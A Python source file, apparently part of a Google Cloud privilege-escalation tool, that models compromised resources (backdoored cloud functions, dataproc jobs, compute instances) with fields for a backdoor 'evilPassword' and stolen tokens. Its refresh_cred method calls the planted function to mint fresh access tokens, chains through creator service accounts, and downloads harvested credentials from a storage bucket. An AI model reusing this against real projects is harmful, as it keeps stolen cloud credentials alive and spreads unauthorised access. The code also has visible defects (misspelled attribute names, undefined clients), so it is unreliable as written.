import urllib
import json

from google.cloud import storage
from sqlalchemy import Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
Base = declarative_base()

class CloudObject(Base):
    __tablename__ = 'cloudfunctions'

    id = Column(Integer, primary_key=True)
    project = Column(String)
    role = Column(String)
    serviceAccount = Column(String)
    evilPassword = Column(String)
    name = Column(String)
    cred = Column(String)
    identity = Column(String)
    creator_identity = Column(String)
    creator_email = Column(String)
    infastructure = Column(String)

    def __repr__(self):
        return "name='%s', role='%s', serviceAccount='%s', project='%s', password='%s'" % (
            self.name, self.role, self.serviceAccount, self.project, self.evilPassword)

    def refresh_cred(self, db_session, run_local, dataproc=None, bucket_name=None, bucket_proj=None):
        print(self.serviceAccount)
        print("refreshing cred")
        if self.infastructure == "cloud_function":
            password = self.evilPassword
            function_url = "https://us-central1-{}.cloudfunctions.net/{}".format(self.project, self.name)
            body = {"password": password, "get_token": True}
            req = urllib.request.Request(function_url)
            req.add_header('Content-Type', 'application/json; charset=utf-8')
            req.add_header('Authorization', 'bearer {}'.format(self.creator_identity))
            jsondata = json.dumps(body)
            jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
            req.add_header('Content-Length', len(jsondataasbytes))
            try:
                response = urllib.request.urlopen(req, jsondataasbytes)
                if response.getcode() == 200:
                    raw_token = response.read()
                    auth_token = json.loads(raw_token)
                    token = auth_token["access_token"]
                    self.cred = token
                    self.identity = auth_token["identity"]
                    return auth_token["identity"]
            except urllib.error.HTTPError:
                print("refreshing parent")
            if self.creator_email:
                self.creator_identity = db_session.query(CloudObject).filter_by(serviceAccount=self.creator_email).first().refresh_cred(db_session, run_local, None, bucket_name, bucket_proj)
            else:
                self.creator_identity = run_local("gcloud auth print-identity-token")
            return self.refresh_cred(db_session, run_local, None, bucket_name, bucket_proj)
        elif self.infastructure == "dataproc":
            if not self.creator_email:
                dataproc(project=self.project, refresh=self)
            else:
                creator = db_session.query(CloudObject).filter_by(serviceAccount=self.creator_email).first()
                return dataproc(source_name=creator.name, project=self.project, refresh=self)
        elif self.infastructure == "compute_instance" or self.infrastructure == "notebook" or self.infrastructure == "pipeline":
            # Pull credentials from GCS
            blob = self.client.bucket(bucket_name).blob(self.serviceAccount).download_to_filename("/tmp/gcploit_temporary_credentials")
            self.cred = open("/tmp/gcploit_temporary_credentials").read()
            self.cred = json.loads(self.cred)["access_token"]

            blob = client.bucket(bucket_name).blob("{}-identity".format(self.serviceAccount)).download_to_filename("/tmp/gcploit_temporary_credentials")
            self.identity= open("/tmp/gcploit_temporary_credentials").read()

            if self.creator_email:
                self.creator_identity = db_session.query(CloudObject).filter_by(serviceAccount=self.creator_email).first().refresh_cred(db_session, run_local, None, bucket_name, bucket_proj)
            else:
                self.creator_identity = run_local("gcloud auth print-identity-token")


def init_db(engine):
    Base.metadata.create_all(engine)
